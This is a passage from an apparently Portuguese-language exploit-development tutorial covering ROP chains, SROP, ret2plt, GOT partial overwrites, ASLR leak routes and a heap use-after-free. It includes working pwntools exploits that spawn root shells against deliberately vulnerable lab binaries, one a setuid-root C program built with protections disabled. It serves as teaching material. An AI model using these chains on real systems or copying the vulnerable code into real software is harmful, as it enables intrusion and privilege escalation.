    # calcular o endereco do one_gadget usando puts como referencia
    fase2 += pop_rbp
    fase2 += p64( (leak &gt;&gt; 4*8 &lt;&lt; 4*8) - (libc.sym.puts - one_gadget) )
    fase2 += add_rax_rbp
        # lembrete: libc.sym e um  offset dentro do libc (e o one_gadget tambem)

    # one gadget constraints r12 r13 == NULL
    fase2 += pop_r12_13_14_15
    fase2 += p64(0)*4 
    fase2 += call_rax

    return fase2

def privesc():
    setuid = b''
    # Ler a got de puts
    setuid += pop_rax
    setuid += p64(binary.got.puts)
    setuid += mov_eax_rax # mov eax [rax]
    
    # calcular o endereco de setuid usando puts como referencia
    setuid += pop_rbp
    setuid += p64( (leak &gt;&gt; 4*8 &lt;&lt; 4*8) - (libc.sym.puts - libc.sym.setuid) )
    setuid += add_rax_rbp

    setuid += pop_rdi
    setuid += p64(0)
    setuid += call_rax
    setuid += p64(0)

    return setuid

def foothold():
    libpivot = ELF(&quot;libpivot.so&quot;)

    # Executar foothold_function para popular o got
    challenge = b''
    challenge += pop_rax
    challenge += p64(binary.plt.foothold_function)
    challenge += call_rax
    challenge += p64(0)

    # Ler a got de foothold_function
    challenge += pop_rax
    challenge += p64(binary.got.foothold_function)
    challenge += mov_eax_rax # mov eax [rax]
    
    # calcular o endereco de ret2win usando foothold como referencia
    challenge += pop_rbp
    challenge += p64( (leak &gt;&gt; 4*8 &lt;&lt; 4*8) - (libpivot.sym.foothold_function - libpivot.sym.ret2win) )
    challenge += add_rax_rbp

    challenge += call_rax
    challenge += p64(0)

    return challenge

# --------------------------------------------------  
# :D
# --------------------------------------------------  
log.critical('''
ARGV modos:
    SHELL  - shell
    PRIV   - root shell
    CTF    - print flag 

ARGV debug: 
    SLEEP  - 5 seg
    LOG    - log verboso
''')

if args.SLEEP: sleep(5)

if args.CTF:
    fase2 = foothold()
elif args.PRIV:
    fase2 = privesc() + get_shell()
elif args.SHELL:
    fase2 = get_shell()
else:
    log.critical(&quot;Por favor, selecione um modo&quot;)
    quit()

io.sendline(fase2)
io.recvuntil(&quot;&gt; &quot;)

io.sendline(fase1)

if args.CTF:
    io.recvuntil(&quot;libpivot\n&quot;)
    log.critical(io.recv(128))
else:
    io.recvuntil(&quot;!\n&quot;)
    io.interactive()
</code></pre>
<a class="header" href="print.html#srop" id="srop"><h1>SROP</h1></a>
<ul>
<li><a href="print.html#srop">SROP</a></li>
<li><a href="print.html#teoria">Teoria</a>
<ul>
<li><a href="print.html#processos-e-signals">Processos e Signals</a></li>
<li><a href="print.html#sigreturn">Sigreturn</a></li>
<li><a href="print.html#fake">Fake</a></li>
</ul>
</li>
<li><a href="print.html#exemplo-sem-leaks">Exemplo Sem leaks</a>
<ul>
<li><a href="print.html#download">Download</a></li>
<li><a href="print.html#solu%C3%A7%C3%A3o">SoluÃ§Ã£o</a></li>
</ul>
</li>
<li><a href="print.html#exemplo-com-leaks">Exemplo Com Leaks</a>
<ul>
<li><a href="print.html#sropc">srop.c</a></li>
<li><a href="print.html#exploit">Exploit</a></li>
</ul>
</li>
</ul>
<a class="header" href="print.html#teoria-1" id="teoria-1"><h1>Teoria</h1></a>
<p>Essa tÃ©cnica que permite voce tornar a stack executÃ¡vel com somente 2 gadgets!</p>
<p>A tÃ©cnica depende da maneira como sistemas <code>UNIX</code> cuidam dos seus processos!</p>
<p>Caso voce precise de uma revisÃ£o em <a href="https://0xturazzi.github.io/book/stack/ret2libc/intro.html#mprotect--ret2shellcode">mprotect + ret2shellcode</a> :D</p>
<a class="header" href="print.html#processos-e-signals" id="processos-e-signals"><h2>Processos e Signals</h2></a>
<a class="header" href="print.html#sigreturn" id="sigreturn"><h2>Sigreturn</h2></a>
<ul>
<li><a href="https://www.tutorialspoint.com/unix_system_calls/sigreturn.htm">tutorialspoint</a></li>
<li><a href="https://man7.org/linux/man-pages/man2/sigreturn.2.html">man sigreturn</a></li>
</ul>
<p>Quando o processo e interrompido, o kernel cria um <code>stack frame</code>
para o <code>signal handler</code> (independentemente de padrÃ£o, ou
implementado pelo programa)... Semelhantemente a quando ocorre uma
<code>call</code> !</p>
<p>Assim como em funÃ§Ãµes (aonde os registers <code>non-scratch</code> precisam
ser salvos), para criar o <code>signal handler</code> antes precisamos salvar
o estado atual usando um struct <code>sigreturn context</code> !</p>
<p><img src="./sigcontext_structure.jpg" alt="sigreturn context diagram" /></p>
<p><img src="https://amriunix.com/img/Sigreturn-oriented-programming-SROP/sigcontext_structure.jpg" alt="" /></p>
<p><a href="https://amriunix.com/img/Sigreturn-oriented-programming-SROP/sigcontext_structure.jpg">Fonte imagem: amriunix</a></p>
<p>Para retornar, o <code>signal handler</code> nao pode usar um simples <code>ret</code>,
portanto usando a <code>syscall sigreturn</code> (<code>rax</code> = <code>0xf</code>)</p>
<p>A syscall era consumir o <code>sigreturn context</code> e continuar execuÃ§Ã£o
normalmente!</p>
<p>Pera ai, e se nos criarmos um <code>sigreturn context</code> falso e chamarmos
essa syscall manualmente????? Como se nos fossemos um
<code>signal handler</code> retornando?????</p>
<a class="header" href="print.html#fake" id="fake"><h2>Fake</h2></a>
<p>Para facilitar a criaÃ§Ã£o desse struct, podemos usar o nosso
amigo pwntools: <a href="https://docs.pwntools.com/en/dev/rop/srop.html">pwntools SROP</a></p>
<p>Criando um struct vazio, e preenchendo-o!</p>
<pre><code class="language-py">frame = SigreturnFrame(arch=&quot;amd64&quot;)
frame.rax = 0xa
frame.rsi = 0x10
frame.rdx = 1234
frame.rip = 123
</code></pre>
<blockquote>
<p>OBS: O struct e dependente da arquitetura, por exemplo, os
registers presente num processador ARM sao diferentes de um amd</p>
</blockquote>
<blockquote>
<p>OBS 2: Voce nao coloca p64() nos valores, se nao buga sei la</p>
</blockquote>
<p>Agora, nos somente precisamos de uma chain que chame <code>sigreturn</code></p>
<p>Eu imagino que voce possa chamar o wrapper em libc, mas para
chamar a syscall basta executar!</p>
<pre><code class="language-x86asm">mov rax, 0xf  ; 15
syscall       ; ou int_80 em 32 bits sei la
</code></pre>
<a class="header" href="print.html#exemplo-sem-leaks" id="exemplo-sem-leaks"><h1>Exemplo Sem leaks</h1></a>
<p>Tabela de syscalls linux: <a href="https://filippo.io/linux-syscall-table/">filippo.io</a></p>
<a class="header" href="print.html#download" id="download"><h2>Download</h2></a>
<p><a href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/16-srop/csaw19_smallboi/small_boi">nightmare: small_boi</a></p>
<a class="header" href="print.html#soluÃ§Ã£o" id="soluÃ§Ã£o"><h2>SoluÃ§Ã£o</h2></a>
<pre><code class="language-py">#!/usr/bin/python3
from pwn import *


elf = ELF(&quot;small_boi&quot;)
io = process(elf.path)

syscall = 0x400180 # mov eax, 0xf; syscall;
                   # +5 = so a syscall

sig = SigreturnFrame(arch='amd64')
sig.rax = 59      # execve
sig.rip = syscall+5
sig.rdi = next(elf.search(b&quot;/bin/sh\x00&quot;))

payload = b'A'*40      # cyclical_find
payload += p64(syscall)
payload += bytes(sig)

io.sendline(payload)
io.interactive()

</code></pre>
<a class="header" href="print.html#exemplo-com-leaks" id="exemplo-com-leaks"><h1>Exemplo Com Leaks</h1></a>
<a class="header" href="print.html#sropc" id="sropc"><h2>srop.c</h2></a>
<ul>
<li><a href="https://amriunix.com/post/sigreturn-oriented-programming-srop/">amriunix</a></li>
<li><a href="https://0x00sec.org/t/srop-signals-you-say/2890">0x00sec</a></li>
</ul>
<pre><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
// gcc srop.c -o srop -no-pie -fno-stack-protector
void syscall_(){
       __asm__(&quot;syscall; ret;&quot;);
}

void set_rax(){
       __asm__(&quot;movl $0xf, %eax; ret;&quot;);
}

int main(){
       // ONLY SROP!
       char buff[100];
       printf(&quot;Buff @%p, can you SROP?\n&quot;, buff);
       read(0, buff, 5000);
       return 0;
}
</code></pre>
<a class="header" href="print.html#exploit" id="exploit"><h2>Exploit</h2></a>
<pre><code class="language-py">#!/usr/bin/python3
from pwn import *


elf = context.binary = ELF(&quot;./srop&quot;)

io = process(elf.path)
io.recvuntil('@')

stack_leak = int(io.recv(14),16)
log.info(&quot;Stack Leak: &quot; + hex(stack_leak))

io.recvuntil(&quot;?\n&quot;)

# Pular Func Prologo
elf.sym.syscall_ += 4
# pwndbg&gt; disassemble syscall_ 
# Dump of assembler code for function syscall_:
#     0x0000000000401132 &lt;+0&gt;:	push   rbp
#     0x0000000000401133 &lt;+1&gt;:	mov    rbp,rsp
#     0x0000000000401136 &lt;+4&gt;:	syscall 
#     0x0000000000401138 &lt;+6&gt;:	ret    
#     0x0000000000401139 &lt;+7&gt;:	nop
#     0x000000000040113a &lt;+8&gt;:	pop    rbp
#     0x000000000040113b &lt;+9&gt;:	ret    

elf.sym.set_rax += 4 
# pwndbg&gt; disassemble set_rax 
# Dump of assembler code for function set_rax:
#      0x000000000040113c &lt;+0&gt;:	push   rbp
#      0x000000000040113d &lt;+1&gt;:	mov    rbp,rsp
#      0x0000000000401140 &lt;+4&gt;:	mov    eax,0xf
#      0x0000000000401145 &lt;+9&gt;:	ret    
#      0x0000000000401146 &lt;+10&gt;:	nop
#      0x0000000000401147 &lt;+11&gt;:	pop    rbp
#      0x0000000000401148 &lt;+12&gt;:	ret    



payload = b&quot;&quot;
payload += asm(shellcraft.execve(&quot;/bin/sh\x00&quot;))
payload += b&quot;A&quot;*(120 - len(payload))
payload += p64(elf.sym.set_rax)
payload += p64(elf.sym.syscall_)        # sigreturn syscall

frame = SigreturnFrame(arch=&quot;amd64&quot;)
frame.rax = 0xa                         # mprotect syscall
frame.rdi = (stack_leak &gt;&gt; 12) &lt;&lt; 12    # Addr
frame.rsi = 0x21000                     # Size
frame.rdx = 7                           # Perms
frame.rip = elf.sym.syscall_            # syscall (mrprotect); Ret
frame.rsp = stack_leak + len(payload) + len(frame) # ret addr
                                        #              \\  
payload += bytes(frame)                 #              \\
payload += p64(stack_leak)              #   &lt;------------
                                        #
                                        # stack_leak ---&gt; shellcode


io.sendline(payload)
io.interactive()
</code></pre>
<a class="header" href="print.html#derrotando-aslr" id="derrotando-aslr"><h1>Derrotando ASLR</h1></a>
<pre><code class="language-py">if RELRO != FULL &amp;&amp; PIE == OFF &amp;&amp; ARCH != 32bits:
    corromper_GOT()

if RELRO == FULL &amp;&amp; PIE == OFF &amp;&amp; ARCH != 32bits:
    re2plt()

if RELRO == FULL &amp;&amp; PIE == ON  &amp;&amp; ARCH == 32bits:
    bruteforce()

else:
    desistir() # =(
</code></pre>
<p>se alguem falar &quot;blablabla elif&quot; eu juro que eu vou cometer um crime &gt;:(</p>
<a class="header" href="print.html#corromper-got" id="corromper-got"><h1>Corromper GOT</h1></a>
<p>Voce provavelmente ja conhece essa tÃ©cnica, visto que eu usei ela em ROP!</p>
<p>Mas resumindo, a GOT armazena o endereÃ§o das funÃ§Ãµes, se voce corromper um item da GOT, quando o programa-lo, vai redirecionar para a funÃ§Ã£o que voce escolheu.</p>
<p>Porem no contexto de ASLR, nao podemos so botar o endereÃ§o de system, pq ne.... ASLR!!!</p>
<p>EntÃ£o, nos podemos fazer um overwrite parcial!</p>
<p>Dependendo da arquitetura e sistema operacional isso pode variar, porem:</p>
<pre><code class="language-py">   7f ff ff    xx xx xx   12 34 
|  Prefixo  | Parte com |  Nosso |
| SEM ASLR  |    ASLR   |  ALVO  |
</code></pre>
<p>Assim, se corrompermos so os <code>LSB</code>s, podemos ignorar a parte do ASLR...</p>
<pre><code class="language-py">puts:    7f ff ff   xx xx xx   10 00 -| offset constante
system:  7f ff ff   xx xx xx   12 34 -| entre elas 0x234

puts:    7f ff ff   11 3c 4c   10 00 -| 0x234
system:  7f ff ff   11 3c 4c   12 34 -|

puts:    7f ff ff   4c 1d 42   10 00 -| 0x234
system:  7f ff ff   4c 1d 42   12 34 -|
</code></pre>
<p>Assim, se adicionarmos ao <code>puts</code> o offset entre ele e <code>system</code>... Usando por exemplo, um gadget
<code>add [rbx] al</code></p>
<p>Isso tambÃ©m pode ser usado no valor armazenado para o <code>ret</code> em BoFs tradicionais! Caso a funÃ§Ã£o
tenha sido chamada pelo libc!</p>
<p><strong>Obs:</strong> Dependendo da vuln, voce usa tipos de offsets diferentes</p>
<ul>
<li>Write -&gt; offset = System - Base_Libc</li>
<li>Add   -&gt; offset = System - puts # Ou qualquer outra funÃ§Ã£o</li>
</ul>
<a class="header" href="print.html#exemplo-1" id="exemplo-1"><h1>Exemplo</h1></a>
<p>Vamos supor que temos um <code>add-what-where</code> -&gt; Ex: <code>add [rbx] al;ret;</code></p>
<pre><code class="language-py">elf = ELF(&quot;vuln123&quot;)
libc = elf.libc

got = elf.got.puts # EndereÃ§o de Puts na got
got += 7 # Queremos alterar somente os bytes 7 e 8
         # Lembrando que isso depende, em alguma outra
         # Pode ser 6 7 8, etc etc....

offset = libc.sym.system - libc.sym.puts

payload = vuln_add(got, offset)
payload += elf.plt.puts # Chamar Puts por meio da plt

io.interactive()
</code></pre>
<ul>
<li><a href="print.html#teoria">Teoria</a></li>
<li><a href="print.html#beatbox-puts-puts-puts-beatbox"><BeatBox> Puts Puts Puts </BeatBox></a></li>
<li><a href="print.html#exemplo">Exemplo</a>
<ul>
<li><a href="print.html#vulnc">vuln.c</a></li>
<li><a href="print.html#exploit">exploit</a></li>
</ul>
</li>
</ul>
<a class="header" href="print.html#teoria-2" id="teoria-2"><h1>Teoria</h1></a>
<blockquote>
<p>Vale a pena revisar GOT e PLT caso precise</p>
</blockquote>
<p>Resumo:</p>
<ul>
<li>
<p>A GOT armazena o endereÃ§o da funcao apos ser resolvida!</p>
</li>
<li>
<p>Quando nos chamamos uma funcao do libc, nao estamos chamando elas  diretamente, e sim a sua entrada na PLT.</p>
</li>
<li>
<p>A PLT checa a GOT, caso o endereÃ§o ja tenha sido resolvido, <code>jmp</code> la... caso o endereÃ§o ainda nao tenha sido, coordena com <code>ld.so</code> para resolver!</p>
</li>
</ul>
<p>A tÃ©cnica ret2plt pode ser considerada o ret2libc do mundo com ASLR!</p>
<p>Da mesma maneira que podÃ­amos retornar para o libc quando o NX foi ativado,
agora podemos voltar para a PLT!</p>
<p>Podemos fazer isso pois a PLT (e GOT) nao tem seu endereÃ§o alterado pelo ASLR,
somente por PIE!</p>
<p>Nos poderÃ­amos usar isso para, por exemplo, chamar system() ... mas existe
uma alternativa mais divertida!</p>
<a class="header" href="print.html#beatbox-puts-puts-puts-beatbox" id="beatbox-puts-puts-puts-beatbox"><h1><BeatBox> Puts Puts Puts </BeatBox></h1></a>
<p>Nos podemos ler a GOT de uma funcao <strong>JA RESOLVIDA</strong>, e calcular o
endereÃ§o da base do libc, ja que as funÃ§Ãµes estÃ£o a um offset constante!</p>
<p>Tendo o endereÃ§o base do libc, podemos chamar quantas funÃ§Ãµes quisermos, mesmo
que nao tenham sido usadas originalmente pelo programa!</p>
<p>Para fazer isso, vamos usar <code>puts</code>: printa uma <code>string</code> pro terminal!</p>
<p>Vamos passar entrada para <code>puts na got</code>, assim: <code>puts vai printar o endereÃ§o resolvido de puts</code></p>
<p>Em seguida, nos chamamos main (ou a funcao vulnerÃ¡vel) e executamos o BoF de
novo, so que agora que a base do libc, podemos usar todo o seu potencial</p>
<p>Em x86_64 bits nos podemos fazer:</p>
<pre><code>pop_rdi_gadget
got.puts

plt.puts    -&gt; rdi = primeiro arg, e rdi aponta para 
              a got com o endereÃ§o resolvido de puts

main
</code></pre>
<p>E em x86 bits:</p>
<pre><code>plt.puts
main
got.puts
</code></pre>
<p>Para calcular a base do libc a partir desse leak, basta fazer:</p>
<pre><code class="language-py">leak = int(recv(), 16)
libc.address = leak - libc.sym.puts
</code></pre>
<p><code>libc.sym.*</code> Armazena o offset dentro daquela versÃ£o do libc, isto e:
<code>puts = base + 0x1234</code>, <code>exit = base + 0x4321</code>, <code>system = base + offset</code>, etc...</p>
<p>Portanto, com <code>leak = puts</code> -&gt; <code>leak = base + 0x1234</code>
-&gt; <code>base = leak - 0x1234</code> -&gt; <code>base = leak - offset</code></p>
<p>Agora, basta criar outra payload e enviar o BoF de novo, so que com: setuid + conexÃ£o remota + system + exit</p>
<p>Ou o que raios a sua imaginaÃ§Ã£o bolar :D</p>
<a class="header" href="print.html#exemplo-2" id="exemplo-2"><h1>Exemplo</h1></a>
<a class="header" href="print.html#vulnc" id="vulnc"><h2>vuln.c</h2></a>
<pre><code class="language-c">#include &lt;stdio.h&gt;
/*
gcc vuln.c -fno-stack-protector -no-pie -ggdb -z relro -z now -o vuln ;
sudo chown root vuln ; 
sudo chmod +s vuln ;
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space ;
checksec vuln ;
*/

/* 
O checksec deve dar:
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
*/
void vuln() {
    puts(&quot;Ola :D ! Qual o seu nome?&quot;);

    char buffer[20];
    gets(buffer);
}

int main() {
    vuln();

    return 0;
}
</code></pre>
<a class="header" href="print.html#exploit-1" id="exploit-1"><h2>exploit</h2></a>
<pre><code class="language-py">#!/usr/bin/python3
from pwn import *
from time import sleep

context.binary = elf = ELF(&quot;vuln&quot;)
libc = elf.libc
rop = ROP(elf)
io = process(elf.path)
io.recvline()

if args.SLEEP: sleep(5)

##################################################
# 
# A plt nao tem seu endereco afetado pelo ASLR
# 
# Entao podemos chamar uma funcao do libc por 
# meio dela, sem precisar de leak
#
# Assim, vamos chamar puts por meio da plt!
#
# Alem disso, a got tambem nao e afetada,
# e ela armazena o endereco das funcoes resolvidas
#
# E oq o puts vai printar? um valor da got!
# Assim, nos dando o leak do libc
#
##################################################

payload = b'A'*40 + flat(
    rop.find_gadget(['pop rdi', 'ret']).address,
    elf.got.puts,
    elf.plt.puts, # call puts(&quot;got.puts&quot;)
    elf.sym.vuln  # voltar pra vuln 
)

io.sendline(payload)

##################################################
#
# Receber leak
#
##################################################

libc.address = int(bytearray(
    io.recvline()[:-1:])[::-1].hex(),
    16) - libc.sym.puts

# &gt;&gt;&gt; leak                                      # Botei um valor qualquer 
#     b'\xf0\xb5[\x16\xc8\x7f\n'
#
# &gt;&gt;&gt; leak[:-1:]                                # Remover \n
#     b'\xf0\xb5[\x16\xc8\x7f'
#
# &gt;&gt;&gt; bytearray(leak[:-1:]).hex()               # converter pra hexstring
#     'f0b55b16c87f'
#
# &gt;&gt;&gt; bytearray(leak[:-1:])[::-1].hex()         # Little Endian
#     '7fc8165bb5f0'
#
# &gt;&gt;&gt; int(bytearray(leak[:-1:])[::-1].hex(),16) # int
#     140497345295856

# Em seguida, leak - offset_puts ===&gt; base_libc

log.success(&quot;Libc Leak: &quot;+hex(libc.address))

##################################################
#
# vuln parte 2, o retorno
#
##################################################

io.recvline()

payload = b'A'*40 + flat(
    # Privesc
    rop.find_gadget(['pop rdi', 'ret']).address,
    0,
    libc.sym.setuid,
    
    # System
    rop.find_gadget(['pop rdi', 'ret']).address,
    next(libc.search(b&quot;/bin/sh\x00&quot;)),
    libc.sym.system,

    # Exit
    rop.find_gadget(['pop rdi', 'ret']).address,
    0,
    libc.sym.exit
)

io.sendline(payload)
io.interactive()
</code></pre>
<a class="header" href="print.html#bruteforce-32-bits" id="bruteforce-32-bits"><h1>Bruteforce (32 bits)</h1></a>
<p>Isso e uma traduÃ§Ã£o / resumo desse post <a href="https://www.nickgregory.me/security/2019/04/06/pivoting-around-memory/">nickgregory: pivoting-around-memory</a></p>
<p>Todos os crÃ©ditos vao para o autor original! :D</p>
<a class="header" href="print.html#intro" id="intro"><h1>Intro</h1></a>
<p>Existem 4 regiÃµes importantes quando exploitando um programa:</p>
<ul>
<li>O binÃ¡rio</li>
<li>Stack</li>
<li>LibC</li>
<li>Heap</li>
</ul>
<p>Em resumo:
<img src="./src/stack/mem_region_pivoting.png" alt="Imagem representando rotas entre as partes" />
<img src="https://raw.githubusercontent.com/0xturazzi/Um-Livrinho-Sobre-Exploit-Dev/main/src/stack/mem_region_pivoting.png" alt="Imagem representando rotas entre as partes" /></p>
<ul>
<li><a href="print.html#intro">Intro</a></li>
<li><a href="print.html#bin---libc--got">Bin -&gt; LibC : GOT</a></li>
<li><a href="print.html#libc---heap--main_arena-pointers">LibC &lt;-&gt; Heap : main_arena pointers</a></li>
<li><a href="print.html#stack---bin-eou-libc--ler-ret-salvo">Stack -&gt; Bin e/ou LibC : Ler ret salvo</a></li>
<li><a href="print.html#libc---stack--__libc_argv-ou-environ">LibC -&gt; Stack : __libc_argv ou environ</a></li>
<li><a href="print.html#libc---ld---bin">LibC -&gt; ld -&gt; Bin</a></li>
</ul>
<a class="header" href="print.html#bin---libc--got" id="bin---libc--got"><h1>Bin -&gt; LibC : GOT</h1></a>
<p>Se <code>PIE == False</code> ou se voce tem um leak da base do programa,
basta ler a GOT.</p>
<a class="header" href="print.html#libc---heap--main_arena-pointers" id="libc---heap--main_arena-pointers"><h1>LibC &lt;-&gt; Heap : main_arena pointers</h1></a>
<p>Se voce tem um read arbitrÃ¡rio ou read-after-free, voce pode
conseguir o endereÃ§o do libc se a arena for a main ...
normalmente como o <code>next</code> pointer nas <code>freelists</code></p>
<p>Seguindo o outro sentido, se voce consegue ler no libc, basta
ler <code>main_arena</code> para conseguir um pointer para o heap</p>
<a class="header" href="print.html#stack---bin-eou-libc--ler-ret-salvo" id="stack---bin-eou-libc--ler-ret-salvo"><h1>Stack -&gt; Bin e/ou LibC : Ler ret salvo</h1></a>
<p>Ler o valor do ret salvo pode te dar um pointer para uma funÃ§Ã£o
do <code>bin</code> (derrotando <code>PIE</code>) ou para uma do <code>LibC</code> (ou de outra lib... o que pode ser util para a exploit chain)</p>
<a class="header" href="print.html#libc---stack--__libc_argv-ou-environ" id="libc---stack--__libc_argv-ou-environ"><h1>LibC -&gt; Stack : __libc_argv ou environ</h1></a>
<p>Se voce tem um read no <code>LibC</code>, voce pode ler os sÃ­mbolos:
<code>__libc_argv</code> ou <code>environ</code>. Eles apontam para valores bem altos
na stack, e muitas vezes existe uma diferenÃ§a <strong>ALEATORIA</strong>
(<code>ASLR</code>) entre eles e o <code>RSP</code>.</p>
<p>De qualquer maneira, voce tem um leak de um pointer na stack, e
pode iterar ate encontrar o ret salvo que aponta para
<code>__libc_start_main</code>, para encontrar a parte importante da stack.</p>
<a class="header" href="print.html#libc---ld---bin" id="libc---ld---bin"><h1>LibC -&gt; ld -&gt; Bin</h1></a>
<p>Nessa tecnica e nescessario passar por um nivel de abstracao, dado
que o <code>LibC</code> nao tem pointers para <code>Bin</code> ! Assim:</p>
<p><strong>LibC -&gt; ld</strong></p>
<p>O Linker Dinamico (<code>ld</code>) sempre esta na memoria e <code>LibC</code> sempre
contem pointers para ele: <code>GOT do libc -&gt; _dl_runtime_resolve</code></p>
<p>E na maior parte dos casos, <code>ld</code> esta em um offset constante em
relaÃ§Ã£o ao <code>LibC</code> pois:</p>
<ul>
<li><code>mmap</code> usa valores alinhados a <code>PAGE_SIZE</code></li>
<li>Normalmente, <code>LibC</code> e <code>ld</code> costumam ser as 2 primeiras libs a
serem carregadas e portanto &quot;<code>mmap</code>adas&quot;</li>
</ul>
<p><strong>ld -&gt; Bin</strong></p>
<p>O valor <code>name</code> dentro do struct <code>_dl_rtld_libname</code> aponta para
<code>.interp</code>, mais especificamente para uma string com o <code>path</code> do
linker, assim, calculando o offset dela dentro de <code>.interp</code> e
consequentemente leakando a base do <code>Bin</code> .</p>
<a class="header" href="print.html#heap" id="heap"><h1>Heap</h1></a>
<ul>
<li><a href="print.html#setup">Setup</a>
<ul>
<li><a href="print.html#malloc_playground">malloc_playground</a></li>
<li><a href="print.html#pwndbg">Pwndbg</a></li>
<li><a href="print.html#villoc--dynamorio">Villoc + DynamoRIO</a></li>
</ul>
</li>
<li><a href="print.html#teoria">Teoria</a></li>
</ul>
<a class="header" href="print.html#setup-1" id="setup-1"><h1>Setup</h1></a>
<a class="header" href="print.html#malloc_playground" id="malloc_playground"><h2>malloc_playground</h2></a>
<p><code>git clone https://github.com/shellphish/how2heap.git</code></p>
<a class="header" href="print.html#pwndbg" id="pwndbg"><h2>Pwndbg</h2></a>
<ul>
<li>
<p>gdb base: <code>sudo apt-get install gdb</code></p>
</li>
<li>
<p>e os coisos de teste: <code>sudo apt-get install libc6-dbg libc6-dbg:i386 libc6-dbg:amd64</code> caso voce tambem queira arm, mips, sei la,....</p>
</li>
<li>
<p><a href="https://github.com/pwndbg/pwndbg">Github: pwndbg</a></p>
</li>
<li>
<p>ou <a href="https://github.com/apogiatzis/gdb-peda-pwndbg-gef">Github: gdb-peda-pwndbg-gef </a></p>
</li>
</ul>
<a class="header" href="print.html#villoc--dynamorio" id="villoc--dynamorio"><h2>Villoc + DynamoRIO</h2></a>
<ul>
<li><a href="https://github.com/DynamoRIO/dynamorio/releases">Github: DynamoRIO</a> Ai voce baixa a versÃ£o mais recente pra sua plataforma.</li>
<li><a href="https://github.com/wapiflapi/villoc/tree/master/tracers/dynamorio">Github: Villoc</a> e aqui as instruÃ§Ãµes para usar DynamoRIO</li>
</ul>
<p>Mas resumindo, voce baixa o <code>tar</code> do DynamoRIO, extrai em <code>/usr/bin</code> ou <code>local</code>,... ou onde voce preferir</p>
<p>E executa <code>export DYNAMORIO_HOME=/usr/bin/DynamoRIO/</code></p>
<p>Ai voce baixa <code>sudo apt-get install cmake</code></p>
<p>Em seguida voce baixa villoc usando <code>git</code> e executa</p>
<pre><code class="language-bash">git clone https://github.com/wapiflapi/villoc.git
cd villoc/tracers/dynamorio
./build.sh
</code></pre>
<p>Para usar usar basta substituir <code>./target</code> pelo programa e <code>bin64</code> por <code>bin32</code> caso necessÃ¡rio!</p>
<pre><code>$DYNAMORIO_HOME/bin64/drrun  -c villoc_tracer villoc.trace -- ./target

villoc.py villoc.trace out.html
</code></pre>
<a class="header" href="print.html#teoria-3" id="teoria-3"><h1>Teoria</h1></a>
<ul>
<li><a href="http://gee.cs.oswego.edu/dl/html/malloc.html">1996: Doug Lea - A Memory Allocator</a></li>
<li><a href="https://heap-exploitation.dhavalkapil.com/">dhavalkapil: Heap Exploitation book</a></li>
<li><a href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/">SploitFUN: sbrk</a></li>
<li><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/">SploitFUN: Malloc</a></li>
<li><a href="https://www.gnu.org/software/libc/manual/html_node/Hooks-for-Malloc.html">GNU: malloc hooks</a></li>
<li><a href="https://linux.die.net/man/3/__malloc_hook">man: __malloc_hook</a></li>
<li><a href="https://stackoverflow.com/questions/120627/is-there-a-way-to-redefine-malloc-at-link-time-on-windows">stackoverflow: Is there a way to redefine malloc at link time on Windows?</a></li>
</ul>
<pre><code>2ef5c8cae179b2d1dcd9c94fec99254acc18e1db6340048293591d98aee2cadf  phoenix/amd64/heap-two
</code></pre>
<pre><code class="language-py">#!/usr/bin/python
from pwn import *
io = process(&quot;/opt/phoenix/amd64/heap-two&quot;)

def leak(report=True):
    io.recvuntil(&quot;auth = &quot;)
    leak_auth = int(io.recvuntil(',').split(',')[0], 16)
    io.recvuntil(&quot;service = &quot;)
    leak_serv = int(io.recvuntil(']\n').split(&quot;]&quot;)[0], 16)
    if report: 
        log.info(&quot;[ auth = {}, service = {} ]&quot;.format(hex(leak_auth), hex(leak_serv)))
    io.sendline(b&quot;&quot;)
    return (leak_auth, leak_serv)
def auth(name=b''):
    io.recvuntil(&quot;]\n&quot;)
    io.sendline(b&quot;auth &quot; + name)
def service(extra=b''):
    io.recvuntil(&quot;]\n&quot;)
    io.sendline(b&quot;service&quot; + extra)
def reset(extra=b''):
    (leak_auth, leak_serv) = leak(False)
    log.info(&quot;Called free on &quot;+hex(leak_auth))
    io.recvuntil(&quot;]\n&quot;)
    io.sendline(b&quot;reset&quot; + extra)
def login(extra=b''):
    io.recvuntil(&quot;]\n&quot;)
    io.sendline(b&quot;login&quot; + extra)
    log.success(io.recvuntil(&quot;\n&quot;))

##################################################
auth(b&quot;A&quot;*32) # pointer auth
reset() # free, mas o pointer nao e destruido
service(b&quot;B&quot;*32) # Alloc overlap
leak()
login() # pointer usado after free, apontando para service
</code></pre>
<a class="header" href="print.html#house-of-force" id="house-of-force"><h1>House of Force</h1></a>
<ul>
<li><a href="print.html#house-of-force">House of Force</a></li>
<li><a href="print.html#teoria">Teoria</a></li>
<li><a href="print.html#va-wrap-around">VA Wrap-Around</a></li>
<li><a href="print.html#limita%C3%A7%C3%B5es">LimitaÃ§Ãµes</a></li>
<li><a href="print.html#fontes-e-materiais-para-praticar">Fontes e Materiais para praticar</a></li>
</ul>
<a class="header" href="print.html#teoria-4" id="teoria-4"><h1>Teoria</h1></a>
<p>A tÃ©cnica da House Of Force consiste em usar um heap overflow para alterar o
tamanho do top_chunk para o valor mÃ¡ximo ( 0xffffffffffffffff ) ... permitindo
que um malloc enorme seja alocado pelo top_chunk!</p>
<p>Esse chunk enorme ira cobrir a distancia entre o alvo e o heap atual!</p>
<pre><code class="language-py"> ______________________________
|                              |  
|  Resto do heap blablabla     |  
|______________________________| 
|             | Size: 0x20     |  &lt;- malloc(0x18)
|   AAAAAAAAAAAAAAAAAAAAAAA    |  &lt;- write(&quot;A&quot;*0x20)
|______________________________|
|                              |  
| Top size: 0x3c0              |  &lt;- Nao teve overflow
|______________________________|

 Agora, vamos usar o overflow para deixar o top_chunk.size gigante
 ______________________________
|                              |  
|  Resto do heap blablabla     |  
|______________________________| 
|             | Size: 0x20     |  &lt;- malloc(0x18)
|   AAAAAAAAAAAAAAAAAAAAAAA    |  &lt;- write(&quot;A&quot;*0x20 + p64(0xffffffffffffffff))
|______________________________|
|                              |  
| Top size: 0xffffffffffffffff |
|______________________________|

Agora, vamos alocar um chunk gigante!

